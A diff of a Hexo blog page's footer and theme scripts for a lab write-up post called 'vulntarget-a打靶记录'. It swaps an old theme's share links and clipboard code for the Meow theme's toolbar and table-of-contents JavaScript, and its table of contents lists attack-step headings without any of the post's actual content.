-          <li><a href="/archives/">归档</a></li>
-        
-          <li><a href="/categories/">分类</a></li>
-        
-          <li><a href="/about/">关于</a></li>
-        
-      </ul>
-    </div>
-
-    
-    
-      <div id="toc-footer" style="display: none">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">拓扑结构</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">2.</span> <span class="toc-text">win7</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.1.</span> <span class="toc-text">信息搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">2.2.</span> <span class="toc-text">ms17_010</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">win2016</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">3.1.</span> <span class="toc-text">添加路由</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">3.2.</span> <span class="toc-text">开启代理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">3.3.</span> <span class="toc-text">proxychains调用nmap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">3.4.</span> <span class="toc-text">redis未授权漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">3.5.</span> <span class="toc-text">连接蚁剑</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">3.6.</span> <span class="toc-text">msf木马</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">win2019</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">4.1.</span> <span class="toc-text">定位域控</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">4.2.</span> <span class="toc-text">路由&amp;代理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">4.3.</span> <span class="toc-text">CVE-2020-1472</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">4.4.</span> <span class="toc-text">impacte获取hash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">4.5.</span> <span class="toc-text">破解hash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-number">4.6.</span> <span class="toc-text">3389远程登录</span></a></li></ol></li></ol>
-      </div>
-    
-
-    <div id="share-footer" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://itsbefore.github.io/archives/2022/08/27/vulntaget-a/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://itsbefore.github.io/archives/2022/08/27/vulntaget-a/&text=vulntarget-a打靶记录"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://itsbefore.github.io/archives/2022/08/27/vulntaget-a/&title=vulntarget-a打靶记录"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://itsbefore.github.io/archives/2022/08/27/vulntaget-a/&is_video=false&description=vulntarget-a打靶记录"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=vulntarget-a打靶记录&body=Check out this article: https://itsbefore.github.io/archives/2022/08/27/vulntaget-a/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://itsbefore.github.io/archives/2022/08/27/vulntaget-a/&title=vulntarget-a打靶记录"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://itsbefore.github.io/archives/2022/08/27/vulntaget-a/&title=vulntarget-a打靶记录"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://itsbefore.github.io/archives/2022/08/27/vulntaget-a/&title=vulntarget-a打靶记录"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://itsbefore.github.io/archives/2022/08/27/vulntaget-a/&title=vulntarget-a打靶记录"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://itsbefore.github.io/archives/2022/08/27/vulntaget-a/&name=vulntarget-a打靶记录&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://itsbefore.github.io/archives/2022/08/27/vulntaget-a/&t=vulntarget-a打靶记录"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-
-    <div id="actions-footer">
-        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
-        
-          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> 目录</a>
-        
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
-    </div>
-
-  </div>
-</div>
-
-        
-        <footer id="footer">
-  <div class="footer-left">
-    Copyright &copy;
-    
-    
-    2021-2025
-    before
-  </div>
-  <div class="footer-right">
-    <nav>
-      <ul>
-        <!--
-       --><li><a href="/">首页</a></li><!--
-     --><!--
-       --><li><a href="/archives/">归档</a></li><!--
-     --><!--
-       --><li><a href="/categories/">分类</a></li><!--
-     --><!--
-       --><li><a href="/about/">关于</a></li><!--
-     -->
-      </ul>
-    </nav>
-  </div>
-</footer>
-
-    </div>
-    <!-- styles -->
-
-
-
-  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
-
-
-    <!-- jquery -->
-
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
-
-
-
-
-<!-- clipboard -->
-
-  
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
-  
-  <script type="text/javascript">
-  $(function() {
-    // copy-btn HTML
-    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板！\">";
-    btn += '<i class="fa-regular fa-clone"></i>';
-    btn += '</span>';
-    // mount it!
-    $(".highlight table").before(btn);
-    var clip = new ClipboardJS('.btn-copy', {
-      text: function(trigger) {
-        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
-      }
+  document.querySelectorAll('#toc-container .toc-list-link').forEach(function (link) {
+    var title = link.querySelector('.toc-list-text').textContent.trim();
+    var item = link.closest('.toc-list-item');
+    var level = (item.className.match(/toc-list-level-(\d)/) || [])[1];
+    var heading = headings.find(function (node) {
+      return usedHeadings.indexOf(node) === -1 &&
+        (!level || node.tagName === 'H' + level) &&
+        node.textContent.trim() === title;
     });
-    clip.on('success', function(e) {
-      e.trigger.setAttribute('aria-label', "复制成功！");
-      e.clearSelection();
-    })
-  })
-  </script>
+    if (!heading) return;
 
+    var target = heading.id ? heading : heading.querySelector('[id]');
+    if (!target) return;
+    usedHeadings.push(heading);
+    link.setAttribute('href', '#' + encodeURIComponent(target.id));
+    link.setAttribute('data-toc-target', target.id);
+  });
 
-<script src="/js/main.js"></script>
+  document.addEventListener('click', function (event) {
+    var link = event.target.closest('#toc-container .toc-list-link[data-toc-target]');
+    if (!link) return;
 
-<!-- search -->
+    var heading = document.getElementById(link.getAttribute('data-toc-target'));
+    if (!heading) return;
 
-<!-- Baidu Analytics -->
+    event.preventDefault();
+    event.stopPropagation();
+    window.history.pushState(null, '', link.getAttribute('href'));
+    heading.scrollIntoView({ behavior: 'smooth', block: 'start' });
+  }, true);
+});</script></aside></div></div><div id="toolbar" hide=""><div id="toolbar-setting-container" hide=""><div class="toolbar-item"><button id="tool-color-mode" title="深色模式" type="button"><img src="/assets/images/svg/ta/ta-moon.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button class="copy-text" id="tool-share" title="分享" type="button" data-text="https://jinggg1123.github.io/archives/2022/08/27/vulntaget-a/"><img src="/assets/images/svg/ta/ta-share.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-font-size-plus" title="放大字体" type="button"><img src="/assets/images/svg/ta/ta-text-plus.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-font-size-minus" title="缩小字体" type="button"><img src="/assets/images/svg/ta/ta-text-minus.svg" class="icon noview" alt="Icon"></button></div></div><div class="toolbar-container"><div class="toolbar-item"><button id="tool-setting" title="设置" type="button"><img src="/assets/images/svg/ta/ta-setting.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-toc" title="目录" type="button" aria-controls="post-sidebar" aria-expanded="true"><img src="/assets/images/svg/ta/ta-toc.svg" class="icon noview" alt="Icon"></button></div><div class="toolbar-item"><button id="tool-gototop" title="返回顶部" type="button"><img src="/assets/images/svg/ta/ta-up.svg" class="icon noview" alt="Icon"></button></div></div></div><div id="music-player"></div></main><footer><div class="footer"><div id="footer-copyright">© 2021 - 2026 <span>💗</span> <a href="/null">jjjing</a></div><div id="footer-info"><div id="footer-framework">🚀本站由 <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/chanwj/hexo-theme-meow" title="3.3.2" target="_blank">Meow</a> 强力驱动</div><div id="footer-runtime"><span id="runtime" data-startdate="2021-11-23T22:16:20.000Z">🌻已稳定运行.年.月.天</span></div></div></div></footer><div class="scripts"><script>const GLOBALCONFIG = {
+  root: '/',
+  toolbar: true,
+  lazyload_src: '/assets/images/Meow-Loading.webp',
+  friends: false,
+  album: '',
+  codeblock: true,
+  code_copy_text: true,
+  share_text: '🐱Share From Meow',
+  onblur_title: 'Please Come Back～✧(´▽`ʃ♡ƪ)',
+  mouse_click: false,
+  notify:{
+    enable: false,
+    info: '复制成功～转载请标注本文地址',
+    f12_info: '开发者模式已打开，请遵循本站版权协议'
+  },
+  search: {
+    enable: false,
+    path: '',
+    local: {
+      top_n_per_article: 1,
+      preload: false
+    }
+  },
+  encrypt: false,
+  category: false,
+};
+</script><script>if (!localStorage.getItem('color-mode')) {
+  localStorage.setItem('color-mode', 'light' || 'light');
+}
+document.body.setAttribute('data-mode', localStorage.getItem('color-mode'));
+</script>
+<script src="/js/theme/tools/utils.js"></script>
 
-<!-- Cloudflare Analytics -->
+<script src="/js/plugins/dist/lazyload.min.js"></script>
 
-<!-- Disqus Comments -->
+<script src="/js/plugins/view-image.min.js"></script>
+<script>if (localStorage.getItem('font-size')) {
+  document.querySelector('.post').style.fontSize = localStorage.getItem('font-size') + 'px';
+}
+</script>
+<script src="/js/plugins/dist/APlayer.min.js"></script>
+<script>const initAplayer = (data) => {
+  if (!data.length) return;
 
-<!-- utterances Comments -->
+  const ap = new APlayer({
+    container: document.getElementById('music-player'),
+    fixed: true,
+    autoplay: false,
+    theme: '#FFB347',
+    loop: 'all',
+    order: 'list',
+    volume: 0.7,
+    lrcType: 3,
+    audio: data
+  });
 
-</body>
-</html>
+  ap.on('play', () => {
+    document.getElementById('music-player').setAttribute("play", "");
+  });
+  ap.on('pause', () => {
+    document.getElementById('music-player').removeAttribute("play");
+  });
+};
+
+const fetchData = () => {
+  fetch('')
+    .then(res => res.json())
+    .then(result => initAplayer(result));
+};
+
+if ('') {
+  document.addEventListener("DOMContentLoaded", fetchData);
+} else {
+  document.addEventListener("DOMContentLoaded", initAplayer());;
+}</script>
+<script src="/js/main.js" type="module"></script>
+</div></body></html>
